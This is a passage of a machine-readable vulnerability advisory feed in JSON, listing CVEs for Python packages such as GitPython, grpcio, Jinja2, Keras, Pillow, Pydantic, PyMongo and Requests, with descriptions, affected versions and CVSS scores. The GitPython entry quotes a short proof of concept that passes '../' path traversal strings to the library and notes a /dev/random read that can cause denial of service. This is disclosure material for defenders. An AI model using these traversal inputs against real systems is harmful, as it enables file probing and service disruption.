Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22190"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":7.8,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":7.8,"environmentalSeverity":"HIGH","integrityImpact":"HIGH","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.8,"temporalSeverity":"HIGH","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H","version":"3.1"},"products":["gitpython@vers:pypi/>=0.0.0|<3.1.41"]}],"title":"CVE-2024-22190/pkg:pypi/gitpython@3.1.35"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-41040"]}],"cve":"CVE-2023-41040","cwe":{"id":"22","name":"Improper Limitation of a Pathname to a Restricted Directory"},"discovery_date":"2023-08-30T20:09:36","ids":[{"system_name":"CVE Record","text":"CVE-2023-41040"},{"system_name":"GitHub Advisory","text":"GHSA-cwvm-v4w8-q58c"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-165"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"GitPython blind local file inclusion"},{"category":"details","details":"Vulnerability Details","text":"# GitPython blind local file inclusion ### Summary  In order to resolve some git references, GitPython reads files from the `.git` directory, in some places the name of the file being read is provided by the user, GitPython doesn't check if this file is located outside the `.git` directory. This allows an attacker to make GitPython read any file from the system.  ### Details  This vulnerability is present in  https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175  That code joins the base directory with a user given string without checking if the final path is located outside the base directory.  I was able to exploit it from three places, but there may be more code paths that lead to it:  https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L605  https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L620  https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/index/base.py#L1353  ### PoC  Running GitPython within any repo should work, here is an example with the GitPython repo.  ```python import git  r = git.Repo(\".\")  # This will make GitPython read the README.md file from the root of the repo r.commit(\"../README.md\") r.tree(\"../README.md\") r.index.diff(\"../README.md\")  # Reading /etc/random # WARNING: this will probably halt your system, run with caution # r.commit(\"../../../../../../../../../dev/random\") ```  ### Impact  I wasn't able to show the contents of the files (that's why \"blind\" local file inclusion), depending on how GitPython is being used, this can be used by an attacker for something _inoffensive_ as checking if a file exits, or cause a DoS by making GitPython read a big/infinite file (like `/dev/random` on Linux systems).  ### Possible solutions  A solution would be to check that the final path isn't located outside the `repodir` path (maybe even after resolving symlinks). Maybe there could be other checks in place to make sure that the reference names are valid.  ---  > [!NOTE] > This vulnerability was reported via email, and it was decided to publish it here and make it public, so the community is aware of it, and a fix can be provided.  ## Related CVE(s) CVE-2023-41040, PYSEC-2023-165"}],"product_status":{"known_affected":["gitpython@vers:pypi/>=0.0.0|<3.1.37"],"known_not_affected":["gitpython@3.1.37"]},"references":[{"summary":"GitHub Advisory GHSA-cwvm-v4w8-q58c","url":"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-cwvm-v4w8-q58c"},{"summary":"GitHub Advisory PYSEC-2023-165","url":"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2023-165.yaml"},{"summary":"Debian Mailing List Announcement","url":"https://lists.debian.org/debian-lts-announce/2023/09/msg00036.html"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-41040"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-41040"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"LOW","baseScore":4.0,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":4.0,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":4.0,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L","version":"3.1"},"products":["gitpython@vers:pypi/>=0.0.0|<3.1.37"]}],"title":"CVE-2023-41040/pkg:pypi/gitpython@3.1.35"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-33953"]}],"cve":"CVE-2023-33953","cwe":{"id":"770","name":"Allocation of Resources Without Limits or Throttling"},"discovery_date":"2023-08-09T15:30:15","ids":[{"system_name":"CVE Record","text":"CVE-2023-33953"},{"system_name":"GitHub Advisory","text":"GHSA-496j-2rq6-j6cc"},{"system_name":"Snyk Advisory","text":"SNYK-RUBY-GRPC-5834442"},{"system_name":"Google Advisory","text":"bulletins"}],"notes":[{"audience":"developers","category":"other","text":"Memory Allocation with Excessive Size Value","title":"Additional CWE: 789"},{"category":"description","details":"Vulnerability Description","text":"Excessive Iteration in gRPC"},{"category":"details","details":"Vulnerability Details","text":"# Excessive Iteration in gRPC gRPC contains a vulnerability that allows hpack table accounting errors could lead to unwanted disconnects between clients and servers in exceptional cases/ Three vectors were found that allow the following DOS attacks:  - Unbounded memory buffering in the HPACK parser - Unbounded CPU consumption in the HPACK parser  The unbounded CPU consumption is down to a copy that occurred per-input-block in the parser, and because that could be unbounded due to the memory copy bug we end up with an O(n^2) parsing loop, with n selected by the client.  The unbounded memory buffering bugs:  - The header size limit check was behind the string reading code, so we needed to first buffer up to a 4 gigabyte string before rejecting it as longer than 8 or 16kb. - HPACK varints have an encoding quirk whereby an infinite number of 0’s can be added at the start of an integer. gRPC’s hpack parser needed to read all of them before concluding a parse. - gRPC’s metadata overflow check was performed per frame, so that the following sequence of frames could cause infinite buffering: HEADERS: containing a: 1 CONTINUATION: containing a: 2 CONTINUATION: containing a: 3 etc…"}],"product_status":{"known_affected":["grpcio@vers:pypi/>=1.56.0|<1.56.2"],"known_not_affected":["grpcio@1.56.2"]},"references":[{"summary":"Google Advisory bulletins","url":"https://cloud.google.com/support/bulletins#gcp-2023-022"},{"summary":"GitHub Advisory GHSA-496j-2rq6-j6cc","url":"https://github.com/advisories/GHSA-496j-2rq6-j6cc"},{"summary":"CVE Record","url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/grpc/CVE-2023-33953.yml"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-33953"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-33953"},{"summary":"Snyk Advisory SNYK-RUBY-GRPC-5834442","url":"https://security.snyk.io/vuln/SNYK-RUBY-GRPC-5834442"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"NONE","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["grpcio@vers:pypi/>=1.56.0|<1.56.2"]}],"title":"CVE-2023-33953/pkg:pypi/grpcio@1.56.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-3651"]}],"cve":"CVE-2024-3651","cwe":{"id":"400","name":"Uncontrolled Resource Consumption"},"discovery_date":"2024-04-11T21:32:40","ids":[{"system_name":"Huntr Advisory","text":"93d78d07-d791-4b39-a845-cbfabc44aadb"},{"system_name":"CVE Record","text":"CVE-2024-3651"},{"system_name":"GitHub Advisory","text":"GHSA-jjg7-2v4v-x38h"},{"system_name":"GitHub Advisory","text":"PYSEC-2024-60"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode"},{"category":"details","details":"Vulnerability Details","text":"# Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode ### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.  ### Patches The function has been refined to reject such strings without the associated resource consumption in version 3.7.  ### Workarounds Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.  ### References * https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb  ## Related CVE(s) CVE-2024-3651, PYSEC-2024-60"}],"product_status":{"known_affected":["idna@vers:pypi/>=0.1|<=3.6"]},"references":[{"summary":"GitHub Advisory GHSA-jjg7-2v4v-x38h","url":"https://github.com/kjd/idna/security/advisories/GHSA-jjg7-2v4v-x38h"},{"summary":"GitHub Advisory PYSEC-2024-60","url":"https://github.com/pypa/advisory-database/tree/main/vulns/idna/PYSEC-2024-60.yaml"},{"summary":"Huntr Advisory 93d78d07-d791-4b39-a845-cbfabc44aadb","url":"https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3651"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3651"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":6.2,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":6.2,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":6.2,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["idna@vers:pypi/>=0.1|<=3.6"]}],"title":"CVE-2024-3651/pkg:pypi/idna@3.4"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-22195"]}],"cve":"CVE-2024-22195","cwe":{"id":"79","name":"Improper Neutralization of Input During Web Page Generation"},"discovery_date":"2024-01-11T15:20:48","ids":[{"system_name":"CVE Record","text":"CVE-2024-22195"},{"system_name":"GitHub Advisory","text":"GHSA-h5c8-rqwp-cp95"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter"},{"category":"details","details":"Vulnerability Details","text":"# Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix."}],"product_status":{"known_affected":["jinja2@vers:pypi/>=2.0|<=3.1.2"]},"references":[{"summary":"GitHub Advisory GHSA-h5c8-rqwp-cp95","url":"https://github.com/pallets/jinja/security/advisories/GHSA-h5c8-rqwp-cp95"},{"summary":"Debian Mailing List Announcement","url":"https://lists.debian.org/debian-lts-announce/2024/01/msg00010.html"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5XCWZD464AJJJUBOO7CMPXQ4ROBC6JX2"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DELCVUUYX75I5K4Q5WMJG4MUZJA6VAIP"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/O7YWRBX6JQCWC2XXCTZ55C7DPMGICCN3"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22195"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22195"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":5.4,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":5.4,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.4,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N","version":"3.1"},"products":["jinja2@vers:pypi/>=2.0|<=3.1.2"]}],"title":"CVE-2024-22195/pkg:pypi/jinja2@3.1.2"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-34064"]}],"cve":"CVE-2024-34064","cwe":{"id":"79","name":"Improper Neutralization of Input During Web Page Generation"},"discovery_date":"2024-05-06T14:20:59","ids":[{"system_name":"CVE Record","text":"CVE-2024-34064"},{"system_name":"GitHub Advisory","text":"GHSA-h75v-3vvj-5mfj"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter"},{"category":"details","details":"Vulnerability Details","text":"# Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.  Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe."}],"product_status":{"known_affected":["jinja2@vers:pypi/>=2.0|<=3.1.3"]},"references":[{"summary":"GitHub Advisory GHSA-h75v-3vvj-5mfj","url":"https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/567XIGSZMABG6TSMYWD7MIYNJSUQQRUC"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GCLF44KY43BSVMTE6S53B4V5WP3FRRSE"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SSCBHIL6BYKR5NRCBXP4XMP2CEEKGFVS"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZALNWE3TXPPHVPSI3AZ5CTMSTAVN5UMS"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34064"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-34064"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":5.4,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":5.4,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.4,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N","version":"3.1"},"products":["jinja2@vers:pypi/>=2.0|<=3.1.3"]}],"title":"CVE-2024-34064/pkg:pypi/jinja2@3.1.2"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-3660"]}],"cve":"CVE-2024-3660","cwe":{"id":"94","name":"Improper Control of Generation of Code"},"discovery_date":"2024-04-16T21:31:28","ids":[{"system_name":"Cert Advisory","text":"253266"},{"system_name":"CVE Record","text":"CVE-2024-3660"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Keras code injection vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# Keras code injection vulnerability A arbitrary code injection vulnerability in TensorFlow's Keras framework (<2.13) allows attackers to execute arbitrary code with the same permissions as the application using a model that allow arbitrary code irrespective of the application."}],"product_status":{"known_affected":["keras@vers:pypi/>=0.0.0|<2.13.1rc0"],"known_not_affected":["keras@2.13.1rc0"]},"references":[{"summary":"Cert Advisory 253266","url":"https://kb.cert.org/vuls/id/253266"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3660"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3660"},{"summary":"Cert Advisory 253266","url":"https://www.kb.cert.org/vuls/id/253266"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":9.8,"baseSeverity":"CRITICAL","confidentialityImpact":"HIGH","environmentalScore":9.8,"environmentalSeverity":"CRITICAL","integrityImpact":"HIGH","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":9.8,"temporalSeverity":"CRITICAL","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","version":"3.1"},"products":["keras@vers:pypi/>=0.0.0|<2.13.1rc0"]}],"title":"CVE-2024-3660/pkg:pypi/keras@2.12.0"},{"acknowledgements":[{"organization":"Checkmarx","urls":["https://devhub.checkmarx.com/cve-details/CVE-2023-50447"]}],"cve":"CVE-2023-50447","cwe":{"id":"94","name":"Improper Control of Generation of Code"},"discovery_date":"2024-01-19T21:30:35","ids":[{"system_name":"CVE Record","text":"CVE-2023-50447"}],"notes":[{"audience":"developers","category":"other","text":"Improper Neutralization of Directives in Dynamically Evaluated Code","title":"Additional CWE: 95"},{"category":"description","details":"Vulnerability Description","text":"Arbitrary Code Execution in Pillow"},{"category":"details","details":"Vulnerability Details","text":"# Arbitrary Code Execution in Pillow Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).  ## Related CVE(s) BIT-pillow-2023-50447, CVE-2023-50447"}],"product_status":{"known_affected":["pillow@vers:pypi/>=0.0.0|<10.2.0"],"known_not_affected":["pillow@10.2.0"]},"references":[{"summary":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/01/20/1"},{"summary":"CVE Record","url":"https://devhub.checkmarx.com/cve-details/CVE-2023-50447"},{"summary":"Cve 2023","url":"https://duartecsantos.github.io/2023-01-02-CVE-2023-50447"},{"summary":"Cve 2023","url":"https://duartecsantos.github.io/2024-01-02-CVE-2023-50447"},{"summary":"Debian Mailing List Announcement","url":"https://lists.debian.org/debian-lts-announce/2024/01/msg00019.html"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-50447"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-50447"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":8.1,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":8.1,"environmentalSeverity":"HIGH","integrityImpact":"HIGH","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":8.1,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H","version":"3.1"},"products":["pillow@vers:pypi/>=0.0.0|<10.2.0"]}],"title":"CVE-2023-50447/pkg:pypi/pillow@10.0.1"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-28219"]}],"cve":"CVE-2024-28219","cwe":{"id":"120","name":"Buffer Copy without Checking Size of Input"},"discovery_date":"2024-04-03T03:30:30","ids":[{"system_name":"CVE Record","text":"CVE-2024-28219"}],"notes":[{"audience":"developers","category":"other","text":"Use of Potentially Dangerous Function","title":"Additional CWE: 676"},{"audience":"developers","category":"other","text":"Integer Overflow to Buffer Overflow","title":"Additional CWE: 680"},{"category":"description","details":"Vulnerability Description","text":"Pillow buffer overflow vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# Pillow buffer overflow vulnerability In _imagingcms.c in Pillow before 10.3.0, a buffer overflow exists because strcpy is used instead of strncpy.  ## Related CVE(s) BIT-pillow-2024-28219, CVE-2024-28219"}],"product_status":{"known_affected":["pillow@vers:pypi/>=0.0.0|<10.3.0"],"known_not_affected":["pillow@10.3.0"]},"references":[{"summary":"Debian Mailing List Announcement","url":"https://lists.debian.org/debian-lts-announce/2024/04/msg00008.html"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4XLPUT3VK4GQ6EVY525TT2QNUIXNRU5M"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-28219"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-28219"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":6.7,"baseSeverity":"MEDIUM","confidentialityImpact":"HIGH","environmentalScore":6.7,"environmentalSeverity":"MEDIUM","integrityImpact":"HIGH","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"HIGH","modifiedPrivilegesRequired":"LOW","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"LOW","scope":"UNCHANGED","temporalScore":6.7,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H","version":"3.1"},"products":["pillow@vers:pypi/>=0.0.0|<10.3.0"]}],"title":"CVE-2024-28219/pkg:pypi/pillow@10.0.1"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-3772"]}],"cve":"CVE-2024-3772","cwe":{"id":"1333","name":"Inefficient Regular Expression Complexity"},"discovery_date":"2024-04-15T03:31:00","ids":[{"system_name":"CVE Record","text":"CVE-2024-3772"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Pydantic regular expression denial of service"},{"category":"details","details":"Vulnerability Details","text":"# Pydantic regular expression denial of service Regular expression denial of service in Pydantic < 2.4.0, < 1.10.13 allows remote attackers to cause denial of service via a crafted email string."}],"product_status":{"known_affected":["pydantic@vers:pypi/>=0.0.0|<1.10.13"],"known_not_affected":["pydantic@1.10.13"]},"references":[{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6JBZLMSH4GAZOVBMT2JUO2LXHY7M2ALI"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3772"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-3772"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":5.9,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.9,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.9,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["pydantic@vers:pypi/>=0.0.0|<1.10.13"]}],"title":"CVE-2024-3772/pkg:pypi/pydantic@1.10.9"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-5629"]}],"cve":"CVE-2024-5629","cwe":{"id":"125","name":"Out-of-bounds Read"},"discovery_date":"2024-06-05T15:30:39","ids":[{"system_name":"CVE Record","text":"CVE-2024-5629"},{"system_name":"Mongodb Advisory","text":"PYTHON-4305"},{"system_name":"Snyk Advisory","text":"SNYK-PYTHON-PYMONGO-6370597"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"PyMongo Out-of-bounds Read in the bson module "},{"category":"details","details":"Vulnerability Details","text":"# PyMongo Out-of-bounds Read in the bson module  Versions of the package pymongo before 4.6.3 are vulnerable to Out-of-bounds Read in the bson module. Using the crafted payload the attacker could force the parser to deserialize unmanaged memory. The parser tries to interpret bytes next to buffer and throws an exception with string. If the following bytes are not printable UTF-8 the parser throws an exception with a single byte."}],"product_status":{"known_affected":["pymongo@vers:pypi/>=0.1.1pre|<=4.6.2"],"known_not_affected":["pymongo@4.6.3"]},"references":[{"summary":"Mongodb Advisory PYTHON-4305","url":"https://jira.mongodb.org/browse/PYTHON-4305"},{"summary":"Debian Mailing List Announcement","url":"https://lists.debian.org/debian-lts-announce/2024/06/msg00007.html"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-5629"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-5629"},{"summary":"Snyk Advisory SNYK-PYTHON-PYMONGO-6370597","url":"https://security.snyk.io/vuln/SNYK-PYTHON-PYMONGO-6370597"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"LOW","baseScore":4.7,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":4.7,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"CHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"CHANGED","temporalScore":4.7,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:L","version":"3.1"},"products":["pymongo@vers:pypi/>=0.1.1pre|<=4.6.2"]}],"title":"CVE-2024-5629/pkg:pypi/pymongo@4.3.3"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-35195"]}],"cve":"CVE-2024-35195","cwe":{"id":"670","name":"Always-Incorrect Control Flow Implementation"},"discovery_date":"2024-05-20T20:15:00","ids":[{"system_name":"CVE Record","text":"CVE-2024-35195"},{"system_name":"GitHub Advisory","text":"GHSA-9wx4-h78v-vm56"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Requests `Session` object does not verify requests after making first request with verify=False"},{"category":"details","details":"Vulnerability Details","text":"# Requests `Session` object does not verify requests after making first request with verify=False When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless 